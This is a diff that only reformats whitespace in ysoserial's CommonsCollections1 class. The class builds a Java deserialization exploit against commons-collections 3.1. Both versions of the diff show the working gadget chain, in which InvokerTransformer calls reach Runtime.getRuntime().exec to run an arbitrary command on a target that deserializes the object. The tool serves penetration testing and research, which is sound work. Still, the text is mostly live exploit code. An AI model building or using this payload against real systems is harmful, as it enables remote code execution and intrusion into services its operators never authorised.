@@ -40,9 +40,9 @@ import ysoserial.payloads.util.Reflections;
 	Requires:
 		commons-collections
  */
-@SuppressWarnings({"rawtypes", "unchecked"})
-@PayloadTest ( precondition = "isApplicableJavaVersion")
-@Dependencies({"commons-collections:commons-collections:3.1"})
+@SuppressWarnings({ "rawtypes", "unchecked" })
+@PayloadTest(precondition = "isApplicableJavaVersion")
+@Dependencies({ "commons-collections:commons-collections:3.1" })
 @Authors({ Authors.FROHOFF })
 public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
 
@@ -50,18 +50,20 @@ public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<
 		final String[] execArgs = new String[] { command };
 		// inert chain for setup
 		final Transformer transformerChain = new ChainedTransformer(
-			new Transformer[]{ new ConstantTransformer(1) });
+				new Transformer[] { new ConstantTransformer(1) });
 		// real chain for after setup
 		final Transformer[] transformers = new Transformer[] {
 				new ConstantTransformer(Runtime.class),
 				new InvokerTransformer("getMethod", new Class[] {
-					String.class, Class[].class }, new Object[] {
-					"getRuntime", new Class[0] }),
+						String.class, Class[].class },
+						new Object[] {
+								"getRuntime", new Class[0] }),
 				new InvokerTransformer("invoke", new Class[] {
-					Object.class, Object[].class }, new Object[] {
-					null, new Object[0] }),
+						Object.class, Object[].class },
+						new Object[] {
+								null, new Object[0] }),
 				new InvokerTransformer("exec",
-					new Class[] { String.class }, execArgs),
+						new Class[] { String.class }, execArgs),
 				new ConstantTransformer(1) };
 
 		final Map innerMap = new HashMap();
@@ -82,6 +84,6 @@ public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<
 	}
 
 	public static boolean isApplicableJavaVersion() {
-        return JavaVersion.isAnnInvHUniversalMethodImpl();
-    }
+		return JavaVersion.isAnnInvHUniversalMethodImpl();
+	}
 }
